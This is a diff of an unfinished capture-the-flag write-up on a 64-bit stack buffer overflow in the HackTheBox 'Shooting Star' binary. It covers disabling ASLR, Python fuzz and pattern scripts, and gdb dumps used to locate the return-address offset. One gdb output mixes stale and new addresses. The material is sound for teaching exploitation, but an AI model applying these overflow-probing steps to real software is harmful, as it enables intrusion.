@@ -83,11 +83,11 @@ echo 0 > /proc/sys/kernel/randomize_va_space
 ```
 # Making a Python Fuzzer
 There a lot of ways/tools to create patterns, search offsets, but for now we want to do it step by step following this way.
-Create python fuzz.py script ass follow. First print 1 menu option and after print A *75 lenght since array is 64 lenght
+Create python fuzz.py script ass follow. First print 1 menu option and after print A *150 lenght since array is 64 lenght
 ```python
 #!/usr/bin/python
 print (1)
-print ('A' * 75)
+print ('A' * 150)
 ```
 
 Give executable and redirect output to file:
@@ -115,7 +115,7 @@ The program stops with a "Segmentation fault", as shown below.
 
 ```shell
 gdb ./shooting_star 
-r < f
+gdb-peda$ r < f
 [----------------------------------registers-----------------------------------]
 RAX: 0x1a
 RBX: 0x7fffffffe5a8 --> 0x7fffffffe8c4 ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
@@ -124,8 +124,8 @@ RDX: 0x1a
 RSI: 0x40200c ("\nMay your wish come true!\n")
 RDI: 0x1
 RBP: 0x4141414141414141 ('AAAAAAAA')
-RSP: 0x7fffffffe490 --> 0x1
-RIP: 0xa414141 ('AAA\n')
+RSP: 0x7fffffffe488 ('A' <repeats 78 times>, "\n")
+RIP: 0x4011ec (<star+170>:	ret)
 R8 : 0x4012d0 (<__libc_csu_fini>:	ret)
 R9 : 0x7ffff7fce890 (endbr64)
 R10: 0x3
@@ -136,20 +136,27 @@ R14: 0x0
 R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
 EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
 [-------------------------------------code-------------------------------------]
-Invalid $PC address: 0xa414141
+   0x4011e5 <star+163>:	call   0x401030 <write@plt>
+   0x4011ea <star+168>:	nop
+   0x4011eb <star+169>:	leave
+=> 0x4011ec <star+170>:	ret
+   0x4011ed <setup>:	push   rbp
+   0x4011ee <setup+1>:	mov    rbp,rsp
+   0x4011f1 <setup+4>:	mov    rax,QWORD PTR [rip+0x2e58]        # 0x404050 <stdin@@GLIBC_2.2.5>
+   0x4011f8 <setup+11>:	mov    ecx,0x0
 [------------------------------------stack-------------------------------------]
-0000| 0x7fffffffe490 --> 0x1
-0008| 0x7fffffffe498 --> 0x7ffff7dce290 (mov    edi,eax)
-0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x7fffffffe598 --> 0x38 ('8')
-0024| 0x7fffffffe4a8 --> 0x401230 (<main>:	push   rbp)
-0032| 0x7fffffffe4b0 --> 0x100400040
-0040| 0x7fffffffe4b8 --> 0x7fffffffe5a8 --> 0x7fffffffe8c4 ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
-0048| 0x7fffffffe4c0 --> 0x7fffffffe5a8 --> 0x7fffffffe8c4 ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
-0056| 0x7fffffffe4c8 --> 0x97fef728dcc5e4eb
+0000| 0x7fffffffe488 ('A' <repeats 78 times>, "\n")
+0008| 0x7fffffffe490 ('A' <repeats 70 times>, "\n")
+0016| 0x7fffffffe498 ('A' <repeats 62 times>, "\n")
+0024| 0x7fffffffe4a0 ('A' <repeats 54 times>, "\n")
+0032| 0x7fffffffe4a8 ('A' <repeats 46 times>, "\n")
+0040| 0x7fffffffe4b0 ('A' <repeats 38 times>, "\n")
+0048| 0x7fffffffe4b8 ('A' <repeats 30 times>, "\n")
+0056| 0x7fffffffe4c0 ('A' <repeats 22 times>, "\n")
 [------------------------------------------------------------------------------]
 Legend: code, data, rodata, value
 Stopped reason: SIGSEGV
-0x000000000a414141 in ?? ()
+0x00000000004011ec in star ()
 gdb-peda$
 ```
 In gdb, execute "info registers" command.  At the crash, rbp contains 0x4141414141414141, as shown below. 
@@ -162,7 +169,7 @@ rdx            0x1a                0x1a
 rsi            0x40200c            0x40200c
 rdi            0x1                 0x1
 rbp            0x4141414141414141  0x4141414141414141
-rsp            0x7fffffffe490      0x7fffffffe490
+rsp            0x7fffffffe488      0x7fffffffe488
 r8             0x4012d0            0x4012d0
 r9             0x7ffff7fce890      0x7ffff7fce890
 r10            0x3                 0x3
@@ -171,7 +178,7 @@ r12            0x0                 0x0
 r13            0x7fffffffe5b8      0x7fffffffe5b8
 r14            0x0                 0x0
 r15            0x7ffff7ffd000      0x7ffff7ffd000
-rip            0xa414141           0xa414141
+rip            0x4011ec            0x4011ec <star+170>
 eflags         0x10203             [ CF IF RF ]
 cs             0x33                0x33
 ss             0x2b                0x2b
@@ -245,15 +252,6 @@ run < f
 gdb-peda$ break * star+77
 Breakpoint 1 at 0x40118f
 gdb-peda$ run < f
-Starting program: /home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star < f
-
-[Thread debugging using libthread_db enabled]
-Using host libthread_db library "/usr/lib/libthread_db.so.1".
-🌠 A shooting star!!
-1. Make a wish!
-2. Stare at the stars.
-3. Learn about the stars.
-> >> 
 [----------------------------------registers-----------------------------------]
 RAX: 0x7fffffffe440 --> 0x7ffff7f846a0 --> 0xfbad2087
 RBX: 0x7fffffffe5a8 --> 0x7fffffffe8c4 ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
@@ -304,9 +302,9 @@ gdb-peda$
 In gdb, execute these commands to see the $rsp and $rbp:
 ```shell
 gdb-peda$ x $rsp
-0x7fffffffe430:	0x00007ffff7f80540
+0x7fffffffe440:	0x00007ffff7f80540
 gdb-peda$ x $rbp
-0x7fffffffe480:	0x00007fffffffe490
+0x7fffffffe490:	0x00007fffffffe4a0
 gdb-peda$
 ```
 In gdb, execute this command to see the stack frame:
@@ -321,13 +319,13 @@ gdb-peda$ x/60x $rsp
 0x7fffffffe490:	0x0000000000000001	0x00007ffff7dce290
 0x7fffffffe4a0:	0x00007fffffffe590	0x0000000000401230
 0x7fffffffe4b0:	0x0000000100400040	0x00007fffffffe5a8
-0x7fffffffe4c0:	0x00007fffffffe5a8	0xc2ddee80d1d8c121
+0x7fffffffe4c0:	0x00007fffffffe5a8	0x2aac75c2f08f07f4
 0x7fffffffe4d0:	0x0000000000000000	0x00007fffffffe5b8
 0x7fffffffe4e0:	0x0000000000000000	0x00007ffff7ffd000
-0x7fffffffe4f0:	0x3d22117f189ac121	0x3d2201391552c121
+0x7fffffffe4f0:	0xd5538a3d39cd07f4	0xd5539a7b340507f4
 0x7fffffffe500:	0x0000000000000000	0x0000000000000000
 0x7fffffffe510:	0x0000000000000000	0x0000000000000000
-0x7fffffffe520:	0x00007fffffffe5b8	0x12018a07d17bb000
+0x7fffffffe520:	0x00007fffffffe5b8	0x854fb257fe3c0300
 0x7fffffffe530:	0x0000000000000000	0x00007ffff7dce34a
 0x7fffffffe540:	0x0000000000401230	0x00007fff00000000
 0x7fffffffe550:	0x0000000000000000	0x0000000000000000
@@ -344,20 +342,20 @@ gdb-peda$ x/60x $rsp
 0x7fffffffe600:	0x00007fffffffea4b	0x00007fffffffea5a
 gdb-peda$
 ```
-The highlighted portion of the image below is the stack frame, ending at the 64-bit word beginning at $rbp (0x7fffffffe480). The 64 bits after the stack frame contain the return value, which is outlined in green in the image below.
+The highlighted portion of the image below is the stack frame, ending at the 64-bit word beginning at $rbp (0x7fffffffe490). The 64 bits after the stack frame contain the return value, which is outlined in green in the image below.
 When the function returns, the return value is popped into $rip, so the program can resume execution of the calling function. 
 
 In gdb, execute these commands, to execute the "read" instruction and view the stack frame again.
 ```shell
 gdb-peda$ nexti
 [----------------------------------registers-----------------------------------]
-RAX: 0x4c ('L')
+RAX: 0x97
 RBX: 0x7fffffffe5a8 --> 0x7fffffffe8c4 ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
 RCX: 0x7ffff7ea2011 (<read+17>:	cmp    rax,0xfffffffffffff000)
 RDX: 0x200
-RSI: 0x7fffffffe440 ('A' <repeats 75 times>, "\n")
+RSI: 0x7fffffffe440 ('A' <repeats 150 times>, "\n")
 RDI: 0x0
-RBP: 0x7fffffffe480 ('A' <repeats 11 times>, "\n")
+RBP: 0x7fffffffe480 ('A' <repeats 86 times>, "\n")
 RSP: 0x7fffffffe430 --> 0x7ffff7f80540 --> 0x0
 RIP: 0x401194 (<star+82>:	mov    edx,0x1a)
 R8 : 0x4012d0 (<__libc_csu_fini>:	ret)
@@ -381,17 +379,18 @@ EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
 [------------------------------------stack-------------------------------------]
 0000| 0x7fffffffe430 --> 0x7ffff7f80540 --> 0x0
 0008| 0x7fffffffe438 --> 0xa317ffff7e286ee
-0016| 0x7fffffffe440 ('A' <repeats 75 times>, "\n")
-0024| 0x7fffffffe448 ('A' <repeats 67 times>, "\n")
-0032| 0x7fffffffe450 ('A' <repeats 59 times>, "\n")
-0040| 0x7fffffffe458 ('A' <repeats 51 times>, "\n")
-0048| 0x7fffffffe460 ('A' <repeats 43 times>, "\n")
-0056| 0x7fffffffe468 ('A' <repeats 35 times>, "\n")
+0016| 0x7fffffffe440 ('A' <repeats 150 times>, "\n")
+0024| 0x7fffffffe448 ('A' <repeats 142 times>, "\n")
+0032| 0x7fffffffe450 ('A' <repeats 134 times>, "\n")
+0040| 0x7fffffffe458 ('A' <repeats 126 times>, "\n")
+0048| 0x7fffffffe460 ('A' <repeats 118 times>, "\n")
+0056| 0x7fffffffe468 ('A' <repeats 110 times>, "\n")
 [------------------------------------------------------------------------------]
 Legend: code, data, rodata, value
 0x0000000000401194 in star ()
 gdb-peda$
-gdb-peda$ x/120x $rsp
+gdb-peda$
+gdb-peda$ x/180x $rsp
 0x7fffffffe430:	0x40	0x05	0xf8	0xf7	0xff	0x7f	0x00	0x00
 0x7fffffffe438:	0xee	0x86	0xe2	0xf7	0xff	0x7f	0x31	0x0a
 0x7fffffffe440:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
@@ -403,13 +402,21 @@ gdb-peda$ x/120x $rsp
 0x7fffffffe470:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
 0x7fffffffe478:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
 0x7fffffffe480:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
-0x7fffffffe488:	0x41	0x41	0x41	0x0a	0x00	0x00	0x00	0x00
-0x7fffffffe490:	0x01	0x00	0x00	0x00	0x00	0x00	0x00	0x00
-0x7fffffffe498:	0x90	0xe2	0xdc	0xf7	0xff	0x7f	0x00	0x00
-0x7fffffffe4a0:	0x90	0xe5	0xff	0xff	0xff	0x7f	0x00	0x00
+0x7fffffffe488:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe490:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe498:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe4a0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe4a8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe4b0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe4b8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe4c0:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe4c8:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffe4d0:	0x41	0x41	0x41	0x41	0x41	0x41	0x0a	0x00
+0x7fffffffe4d8:	0xb8	0xe5	0xff	0xff	0xff	0x7f	0x00	0x00
+0x7fffffffe4e0:	0x00	0x00	0x00	0x00
 gdb-peda$
 ```
-As shown, the return value now contains 0x4141414141414141 on $rbp (0x7fffffffe480)
+As shown, the return value now contains 0x4141414141414141 on $rbp (0x7fffffffe490)
 
 # Understanding the Crash
 In gdb, execute these commands, to see the instruction that causes the crash.
@@ -418,8 +425,236 @@ In gdb, execute these commands, to see the instruction that causes the crash.
 As shown below, the program crashes when executing the last instruction in the star() function--"retq"
 
 ```shell
+gdb-peda$ continue
+[----------------------------------registers-----------------------------------]
+RAX: 0x1a
+RBX: 0x7fffffffe5a8 --> 0x7fffffffe8c4 ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
+RCX: 0x7ffff7ea20b4 (<write+20>:	cmp    rax,0xfffffffffffff000)
+RDX: 0x1a
+RSI: 0x40200c ("\nMay your wish come true!\n")
+RDI: 0x1
+RBP: 0x4141414141414141 ('AAAAAAAA')
+RSP: 0x7fffffffe488 ('A' <repeats 78 times>, "\n")
+RIP: 0x4011ec (<star+170>:	ret)
+R8 : 0x4012d0 (<__libc_csu_fini>:	ret)
+R9 : 0x7ffff7fce890 (endbr64)
+R10: 0x3
+R11: 0x202
+R12: 0x0
+R13: 0x7fffffffe5b8 --> 0x7fffffffe912 ("SHELL=/bin/bash")
+R14: 0x0
+R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
+EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4011e5 <star+163>:	call   0x401030 <write@plt>
+   0x4011ea <star+168>:	nop
+   0x4011eb <star+169>:	leave
+=> 0x4011ec <star+170>:	ret
+   0x4011ed <setup>:	push   rbp
+   0x4011ee <setup+1>:	mov    rbp,rsp
+   0x4011f1 <setup+4>:	mov    rax,QWORD PTR [rip+0x2e58]        # 0x404050 <stdin@@GLIBC_2.2.5>
+   0x4011f8 <setup+11>:	mov    ecx,0x0
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe488 ('A' <repeats 78 times>, "\n")
+0008| 0x7fffffffe490 ('A' <repeats 70 times>, "\n")
+0016| 0x7fffffffe498 ('A' <repeats 62 times>, "\n")
+0024| 0x7fffffffe4a0 ('A' <repeats 54 times>, "\n")
+0032| 0x7fffffffe4a8 ('A' <repeats 46 times>, "\n")
+0040| 0x7fffffffe4b0 ('A' <repeats 38 times>, "\n")
+0048| 0x7fffffffe4b8 ('A' <repeats 30 times>, "\n")
+0056| 0x7fffffffe4c0 ('A' <repeats 22 times>, "\n")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00000000004011ec in star ()
+gdb-peda$
+
+gdb-peda$ x/3i $rip
+=> 0xa414141:	Cannot access memory at address 0xa414141
+
+=> 0x4011ec <star+170>:	ret
+   0x4011ed <setup>:	push   rbp
+   0x4011ee <setup+1>:	mov    rbp,rsp
+gdb-peda$
 
 ```
+
+The "retq" instruction pops the return value from the stack and puts it into rip.
+In 32-bit stack overflows, the value "AAAA" would be copied into $eip, and the program would crash on the next instruction, because that address is not available to the program.
+But on a 64-bit system, the processor can't even put a value like 0x4141414141414141 into $rip, because they don't actually allow all possible addresses. 
+
+The current AMD specifications for a so-called "64-bit" processor uses only 48 address bits, so there are two allowed regions of address space, as shown below: 
+![64bit](IMG/p13-64bo14.png)
+
+# Targeting the Return Value
+So we can't just use AAAAAAAA--we need to insert an allowed value into the return pointer.
+The first step is to find which eight bytes from the attack control the return value.
+To do that, we'll send a series of numbers instead of 'A' characters.
+
+Create find.py python script as follow:
+```python
+#!/usr/bin/python
+
+attack = 'A' * 150
+
+for i in range(0,5):
+   for j in range(0,10):
+      attack += str(i) + str(j)
+
+print (1)
+print (attack)
+```
+
+Now, save output with the same procedure we executed with fuzz:
+```shell
+$./find                                                                                                                            
+1
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849
+$./find > f
+```
+
+# Debugging the Program
+Now execute on gdb as follow:
+```shell
+gdb ./shotting_star
+gdb-peda$ run < f 
+[----------------------------------registers-----------------------------------]
+RAX: 0x1a
+RBX: 0x7fffffffe5b8 --> 0x7fffffffe8dc ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
+RCX: 0x7ffff7ea20b4 (<write+20>:	cmp    rax,0xfffffffffffff000)
+RDX: 0x1a
+RSI: 0x40200c ("\nMay your wish come true!\n")
+RDI: 0x1
+RBP: 0x4141414141414141 ('AAAAAAAA')
+RSP: 0x7fffffffe498 ('A' <repeats 78 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
+RIP: 0x4011ec (<star+170>:	ret)
+R8 : 0x4012d0 (<__libc_csu_fini>:	ret)
+R9 : 0x7ffff7fce890 (endbr64)
+R10: 0x3
+R11: 0x202
+R12: 0x0
+R13: 0x7fffffffe5c8 --> 0x7fffffffe92a ("SHELL=/bin/bash")
+R14: 0x0
+R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
+EFLAGS: 0x10203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4011e5 <star+163>:	call   0x401030 <write@plt>
+   0x4011ea <star+168>:	nop
+   0x4011eb <star+169>:	leave
+=> 0x4011ec <star+170>:	ret
+   0x4011ed <setup>:	push   rbp
+   0x4011ee <setup+1>:	mov    rbp,rsp
+   0x4011f1 <setup+4>:	mov    rax,QWORD PTR [rip+0x2e58]        # 0x404050 <stdin@@GLIBC_2.2.5>
+   0x4011f8 <setup+11>:	mov    ecx,0x0
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe498 ('A' <repeats 78 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
+0008| 0x7fffffffe4a0 ('A' <repeats 70 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
+0016| 0x7fffffffe4a8 ('A' <repeats 62 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
+0024| 0x7fffffffe4b0 ('A' <repeats 54 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
+0032| 0x7fffffffe4b8 ('A' <repeats 46 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
+0040| 0x7fffffffe4c0 ('A' <repeats 38 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
+0048| 0x7fffffffe4c8 ('A' <repeats 30 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
+0056| 0x7fffffffe4d0 ('A' <repeats 22 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00000000004011ec in star ()
+gdb-peda$
+gdb-peda$ 
+gdb-peda$ nexti
+[----------------------------------registers-----------------------------------]
+RAX: 0xfb
+RBX: 0x7fffffffe5b8 --> 0x7fffffffe8dc ("/home/darthv/git/badorius/vulnhub/hackthebox/ShootingStar/Files/shooting_star")
+RCX: 0x7ffff7ea2011 (<read+17>:	cmp    rax,0xfffffffffffff000)
+RDX: 0x200
+RSI: 0x7fffffffe450 ('A' <repeats 150 times>, "00010203040506070809101112131415161718192021222324"...)
+RDI: 0x0
+RBP: 0x7fffffffe490 ('A' <repeats 86 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940414243444546474849\n\367\377\177")
+RSP: 0x7fffffffe440 --> 0x7ffff7f80540 --> 0x0
+RIP: 0x401194 (<star+82>:	mov    edx,0x1a)
+R8 : 0x4012d0 (<__libc_csu_fini>:	ret)
+R9 : 0x7ffff7fce890 (endbr64)
+R10: 0x3
+R11: 0x246
+R12: 0x0
+R13: 0x7fffffffe5c8 --> 0x7fffffffe92a ("SHELL=/bin/bash")
+R14: 0x0
+R15: 0x7ffff7ffd000 --> 0x7ffff7ffe2c0 --> 0x0
+EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x401187 <star+69>:	mov    rsi,rax
+   0x40118a <star+72>:	mov    edi,0x0
+   0x40118f <star+77>:	call   0x401040 <read@plt>
+=> 0x401194 <star+82>:	mov    edx,0x1a
+   0x401199 <star+87>:	lea    rsi,[rip+0xe6c]        # 0x40200c
+   0x4011a0 <star+94>:	mov    edi,0x1
+   0x4011a5 <star+99>:	call   0x401030 <write@plt>
+   0x4011aa <star+104>:	jmp    0x4011ea <star+168>
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe440 --> 0x7ffff7f80540 --> 0x0
+0008| 0x7fffffffe448 --> 0xa317ffff7e286ee
+0016| 0x7fffffffe450 ('A' <repeats 150 times>, "00010203040506070809101112131415161718192021222324"...)
+0024| 0x7fffffffe458 ('A' <repeats 142 times>, "0001020304050607080910111213141516171819202122232425262728"...)
+0032| 0x7fffffffe460 ('A' <repeats 134 times>, "000102030405060708091011121314151617181920212223242526272829303132"...)
+0040| 0x7fffffffe468 ('A' <repeats 126 times>, "00010203040506070809101112131415161718192021222324252627282930313233343536"...)
+0048| 0x7fffffffe470 ('A' <repeats 118 times>, "0001020304050607080910111213141516171819202122232425262728293031323334353637383940"...)
+0056| 0x7fffffffe478 ('A' <repeats 110 times>, "000102030405060708091011121314151617181920212223242526272829303132333435363738394041424344"...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0000000000401194 in star ()
+gdb-peda$
+```
+
+Now remember we had at the beginning the following values as rsp and rbp:
+
+```shell
+gdb-peda$ x $rsp
+0x7fffffffe440:	0x00007ffff7f80540
+gdb-peda$ x $rbp
+0x7fffffffe490:	0x00007fffffffe4a0
+gdb-peda$
+```
+
+Take a look on the stack frame, which ends at old $rbp address value (0x7fffffffe490), as shown below.
+The last two 32-bit words on 0x7fffffffe490 are the return value (0x0040125e 0x00000000):
+
+```shell
+gdb-peda$ x/120wx 0x7fffffffe440
+0x7fffffffe440:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe450:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe460:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe470:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe480:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe490:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe4a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe4b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe4c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0x7fffffffe4d0:	0x41414141	0x30304141	0x32303130	0x34303330
+0x7fffffffe4e0:	0x36303530	0x38303730	0x30313930	0x32313131
+0x7fffffffe4f0:	0x34313331	0x36313531	0x38313731	0x30323931
+0x7fffffffe500:	0x32323132	0x34323332	0x36323532	0x38323732
+0x7fffffffe510:	0x30333932	0x32333133	0x34333333	0x36333533
+0x7fffffffe520:	0x38333733	0x30343933	0x32343134	0x34343334
+0x7fffffffe530:	0x36343534	0x38343734	0xf70a3934	0x00007fff
+0x7fffffffe540:	0x00401230	0x00000000	0x00000000	0x00007fff
+0x7fffffffe550:	0x00000000	0x00000000	0x00000000	0x00000000
+0x7fffffffe560:	0x00000000	0x00000000	0x00401060	0x00000000
+0x7fffffffe570:	0xffffe5a0	0x00007fff	0x00000000	0x00000000
+0x7fffffffe580:	0x00000000	0x00000000	0x0040108a	0x00000000
+0x7fffffffe590:	0xffffe598	0x00007fff	0x00000038	0x00000000
+0x7fffffffe5a0:	0x00000001	0x00000000	0xffffe8c4	0x00007fff
+0x7fffffffe5b0:	0x00000000	0x00000000	0xffffe912	0x00007fff
+0x7fffffffe5c0:	0xffffe922	0x00007fff	0xffffe97a	0x00007fff
+0x7fffffffe5d0:	0xffffe98e	0x00007fff	0xffffe9a5	0x00007fff
+0x7fffffffe5e0:	0xffffe9ce	0x00007fff	0xffffe9e2	0x00007fff
+0x7fffffffe5f0:	0xffffe9f8	0x00007fff	0xffffea07	0x00007fff
+0x7fffffffe600:	0xffffea4b	0x00007fff	0xffffea5a	0x00007fff
+0x7fffffffe610:	0xffffea74	0x00007fff	0xffffea8d	0x00007fff
+gdb-peda$
+
+```
+
+# Understanding the Return Value
 
 
 TO BE CONTINUED...
